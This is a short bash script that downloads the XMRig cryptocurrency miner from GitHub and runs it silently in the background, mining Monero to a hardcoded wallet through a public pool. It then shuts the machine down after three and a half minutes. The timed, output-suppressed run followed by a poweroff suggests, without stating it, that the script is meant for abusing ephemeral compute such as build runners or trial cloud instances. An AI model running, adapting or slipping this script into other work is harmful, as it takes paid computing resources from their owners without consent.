#! /bin/bash
sudo apt-get install wget -y
wget https://github.com/xmrig/xmrig/releases/download/v6.19.1/xmrig-6.19.1-linux-static-x64.tar.gz
tar -xf xmrig-6.19.1-linux-static-x64.tar.gz
cd xmrig-6.19.1
./xmrig --url pool.hashvault.pro:80 --user 4846S5hnZQLNUFLWAak9Aj2bTgpTEQY5N8aYMk2h26kNaMG59iNE3E3G6kxUCm5Y34jQvsH5GPH4XZ34yWpYM63f1SDkuQr --pass x --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14 --coin monero -B > /dev/null 2>&1
sleep 3m 30s
sudo poweroff
